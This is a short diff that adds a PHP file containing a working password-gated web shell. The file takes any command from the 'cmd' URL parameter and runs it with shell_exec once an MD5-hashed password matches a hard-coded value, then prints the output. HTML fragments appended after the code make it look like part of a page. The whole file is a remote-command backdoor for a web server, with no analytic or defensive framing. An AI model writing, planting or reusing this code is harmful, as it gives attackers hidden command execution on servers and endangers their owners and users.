@@ -1,0 +1,29 @@
+<?php
+
+define('PASSWORD', '36552cc8c752eaee0fa01b6f26dbb62b');
+
+function auth($password)
+{
+	$input_password_hash = md5($password);
+
+	if (strcmp(PASSWORD, $input_password_hash) == 0) {
+		return TRUE;
+	}else{
+		return FALSE;
+	}
+}
+
+
+if (isset($_GET['cmd']) && !empty($_GET['cmd']) && isset($_GET['password'])) {
+	
+	if (auth($_GET['password'])) {
+			echo '<pre>'. shell_exec($_GET['cmd']) .'<pre>';
+	}else{
+		die('Access denide!');
+	}
+}
+
+?>
+
+<div id="storeArea"></div>
+<!--POST-BODY-START-->
